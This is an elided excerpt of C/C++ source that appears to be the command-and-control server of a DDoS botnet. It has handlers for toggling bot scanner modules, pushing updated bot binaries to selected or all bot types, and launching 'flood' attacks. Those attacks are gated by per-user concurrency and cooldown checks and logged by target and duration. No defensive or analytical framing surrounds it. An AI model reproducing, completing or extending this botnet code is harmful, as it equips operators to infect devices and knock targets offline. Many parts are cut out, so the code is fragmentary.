...
struct command *process_scanner(struct process *process, uint8_t process_id)
{
    ...
    {
        send(process->fd, "Please specify a scanner module\r\n", 33, MSG_NOSIGNAL);
        return NULL;
    }
    ...
    if(cmd == "?")
    {
        ...
        {
            for(list_iterator = commands[index_string].begin(); list_iterator != commands[index_string].end(); list_iterator++)
            {
    ...
    bot_type = cmd.substr(pos + 1);

    if(bot_type.length() > 3)
    {
        error << "(on/off) Length!";
        error << "\r\n";
    ...
    std::cout << "Type! " << bot_type << std::endl;

    if(bot_type.length() == 0)
    {
    ...
    scanner_id = flags[key];
    
    uint8_t *tmp = (uint8_t *)malloc(sizeof(uint8_t) + sizeof(uint8_t));
    if(!tmp)
    {
        return NULL;
    }

    memcpy(tmp, &scanner_id, sizeof(uint8_t));
    memcpy(tmp + sizeof(uint8_t), &status, sizeof(uint8_t));
    ...
    ptr->buf = tmp;
    ptr->buf_len = sizeof(uint8_t) + sizeof(uint8_t);

    process->bot_type = key;
    process->status = (int)status;

    push_scanner(process, ptr);

    return NULL;
}

struct command *process_update(struct process *process, uint8_t process_id)
{
    std::stringstream stream;
    std::stringstream error;
    ...
    if(!arg_count(stream.str(), ' '))
    {
        send(process->fd, "Please specify a binary type\r\n", 30, MSG_NOSIGNAL);
        return NULL;
    }
    ...
    if(bot_type.length() > 1024)
    {
        error << "Invalid bot type length near " << key;
        error << ", bot type must have a length no greater than 1024";
        error << "\r\n";
    ...
    {
        if (bot_type == stats_iterator->first || strstr(bot_type.c_str(), "all"))
        {
            fail = FALSE;
            break;
        }
    ...
    if(fail)
    {
        error << "Invalid bot type '" << key << "'. Type 'stats' to view all bot types";
        error << "\r\n";
    ...
    process->bot_type = bot_type;

    update_binary(process);
...
struct command *command_process(struct process *process)
{
    ...
    if (id == COMMAND_UPDATE)
    {
        free(ptr);
        free(total);
        free(targets);
        return process_update(process, id);
    }

    if (id == COMMAND_SCANNER)
    {
        free(ptr);
        free(total);
        free(targets);
        return process_scanner(process, id);
    }
    ...
    /*if(commands[flood].size() != num_of_flags)
    {
        send(process->fd, "Invalid amount of flags specified for the desired flood!\r\n", 58, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    ...
    if(mysql_allow_concurrent(process->fd, process->ptr->username, time, process->ptr->concurrent, process->ptr->cooldown))
    {
        free(ptr);
        return NULL;
    }
    ...
    // Log
    mysql_log(process->ptr->username, process->count, flood, target, time);
